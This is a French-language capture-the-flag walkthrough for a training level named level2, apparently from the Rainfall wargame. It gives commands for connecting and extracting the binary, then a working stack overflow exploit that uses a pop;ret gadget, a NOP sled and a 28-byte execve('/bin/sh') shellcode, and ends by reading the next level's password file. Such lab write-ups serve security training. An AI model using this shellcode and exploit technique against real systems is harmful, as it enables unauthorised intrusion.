# Level2 — Commands

## Connection

```bash
ssh level2@localhost -p 4242
```

Password: (in `level1/flag`)

---

## Recon

```bash
pwd
ls -la
file level2
readelf -h level2
```

Extraction (from the host):

```bash
cd level2
sshpass -p '<level2_password>' scp -o StrictHostKeyChecking=no -P 4242 level2@localhost:level2 ./level2.bin
```

Local analysis: `strings`, `readelf -s`, `objdump -d`. See `analysis.md`.

---

## Exploitation

Le binaire n’a pas `system`. Overflow dans `p()` avec filtre sur l’adresse de retour (interdiction 0xb0...). On utilise un gadget `pop; ret` (0x08048385) et du shellcode dans le buffer.

**Budget :** depuis `buf[0]`, il y a **80 octets** avant le saved EIP : `NOP×40 + shellcode + padding = 80` (voir `Ressources/shellcode.md`).

**Référence shellcode (28 octets) :** [Shell-Storm — shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html) (Jean Pascal Pereira — Linux/x86 `execve("/bin/sh")`). Les **28 octets** viennent de la somme des encodages d’instructions (pas du sujet Rainfall) — détail dans `Ressources/shellcode.md`.

```python
# Python 2 sur la VM
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
    "\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
)
```

Payload avec **NOP sled** (40 octets) : `padding = 80 - 40 - 28 = 12` octets `A`. Si « Illegal instruction », l’adresse du buffer est fausse.

```bash
( python -c '
import struct
NOP = "\x90"
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
    "\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
)
nopsled = NOP * 40
pad = 80 - len(nopsled) - len(shellcode)
buf_addr = 0xbffff700   # essayer la liste ci‑dessous ou GDB
gadget = 0x08048385
payload = nopsled + shellcode + "A"*pad + struct.pack("<I", gadget) + struct.pack("<I", buf_addr) + struct.pack("<I", buf_addr)
print payload
'; cat ) | ./level2
```

**Adresses à tester** (une par une) si « Illegal instruction » ou rien :  
`0xbffff5e0`, `0xbffff600`, `0xbffff650`, `0xbffff6a0`, `0xbffff6c0`, `0xbffff700`, `0xbffff750`.

*(Variante 30 octets : [buffer-i386-cool](https://github.com/buffer/shellcodes/blob/master/buffer-i386-cool.c) → `padding = 10` ; voir `Ressources/shellcode.md`.)*

---

## Récupération du mot de passe level3

Dans le shell : `cat /home/user/level3/.pass`. Noter dans `level2/flag`.
